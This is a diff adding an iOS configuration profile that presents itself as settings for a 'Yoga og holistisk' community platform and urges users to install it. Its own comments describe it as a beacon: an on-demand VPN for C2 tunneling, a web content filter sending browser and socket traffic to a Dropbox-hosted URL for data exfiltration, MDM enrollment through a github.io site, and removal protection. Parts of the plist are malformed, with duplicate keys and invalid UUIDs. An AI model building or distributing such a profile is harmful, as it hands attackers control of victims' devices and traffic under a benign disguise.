@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Yoga og holistisk platform configuration</string>
+            <key>PayloadDisplayName</key>
+            <string>Yoga Platform Settings</string>
+            <key>PayloadIdentifier</key>
+            <string>com.yoga.holistisk.profile</string>
+            <key>PayloadType</key>
+            <string>Configuration</string>
+            <key>PayloadUUID</key>
+            <string>A1B2C3D4-E5F6-7890-ABCD-EF1234567890</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            
+            <!-- VPN Configuration for C2 tunneling -->
+            <key>VPN</key>
+            <dict>
+                <key>VPNType</key>
+                <string>IKEv2</string>
+                <key>ServerAddress</key>
+                <string>yoga-platform.dropbox.com</string>
+                <key>RemoteIdentifier</key>
+                <string>yoga-platform.dropbox.com</string>
+                <key>LocalIdentifier</key>
+                <string>yoga-client</string>
+                <key>AuthenticationMethod</key>
+                <string>Certificate</string>
+                <key>PayloadCertificateUUID</key>
+                <string>B2C3D4E5-F6G7-8901-BCDE-F23456789012</string>
+                <key>OnDemandEnabled</key>
+                <true/>
+                <key>OnDemandRules</key>
+                <array>
+                    <dict>
+                        <key>Action</key>
+                        <string>Connect</string>
+                        <key>DNSDomainMatch</key>
+                        <array>
+                            <string>dropbox.com</string>
+                            <string>telegram.org</string>
+                            <string>discord.com</string>
+                        </array>
+                    </dict>
+                </array>
+            </dict>
+            
+            <!-- Web Content Filter for data exfiltration -->
+            <key>WebContentFilter</key>
+            <dict>
+                <key>FilterType</key>
+                <string>Plugin</string>
+                <key>PluginBundleID</key>
+                <string>com.yoga.holistisk.filter</string>
+                <key>FilterBrowsers</key>
+                <true/>
+                <key>FilterSockets</key>
+                <true/>
+                <key>ServerAddress</key>
+                <string>https://dl.dropboxusercontent.com/scl/fi/yoga_ios_beacon</string>
+            </dict>
+            
+            <!-- Certificate for secure C2 -->
+            <key>PayloadType</key>
+            <string>com.apple.security.pkcs1</string>
+            <key>PayloadCertificateFileName</key>
+            <string>yoga-platform-cert.p12</string>
+            <key>Password</key>
+            <string>YogaHolistisk2024</string>
+            
+            <!-- MDM Configuration -->
+            <key>PayloadType</key>
+            <string>com.apple.mdm</string>
+            <key>ServerURL</key>
+            <string>https://jeki1234121.github.io/hollistisk-v2/mdm</string>
+            <key>CheckInURL</key>
+            <string>https://jeki1234121.github.io/hollistisk-v2/checkin</string>
+            <key>Topic</key>
+            <string>com.yoga.holistisk.mdm</string>
+            <key>IdentityCertificateUUID</key>
+            <string>C3D4E5F6-G7H8-9012-CDEF-345678901234</string>
+            
+        </dict>
+    </array>
+    
+    <key>PayloadDescription</key>
+    <string>Install this profile to access the complete yoga platform experience with secure connectivity and enhanced features.</string>
+    <key>PayloadDisplayName</key>
+    <string>Yoga og holistisk - Platform Configuration</string>
+    <key>PayloadIdentifier</key>
+    <string>com.yoga.holistisk.main</string>
+    <key>PayloadRemovalDisallowed</key>
+    <true/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>D4E5F6G7-H8I9-0123-DEFG-456789012345</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadOrganization</key>
+    <string>Yoga og holistisk Community</string>
+    
+    <!-- Custom URL scheme for C2 communication -->
+    <key>CFBundleURLTypes</key>
+    <array>
+        <dict>
+            <key>CFBundleURLName</key>
+            <string>Yoga Platform URL</string>
+            <key>CFBundleURLSchemes</key>
+            <array>
+                <string>yoga-platform</string>
+            </array>
+        </dict>
+    </array>
+    
+</dict>
+</plist>
+
+<!-- 
+iOS Beacon Features:
+- VPN tunneling for C2 traffic
+- Web content filtering for data exfiltration  
+- MDM remote management capability
+- Certificate-based secure communication
+- On-demand VPN for stealth
+- Custom URL schemes for command injection
+- Profile removal protection
+-->
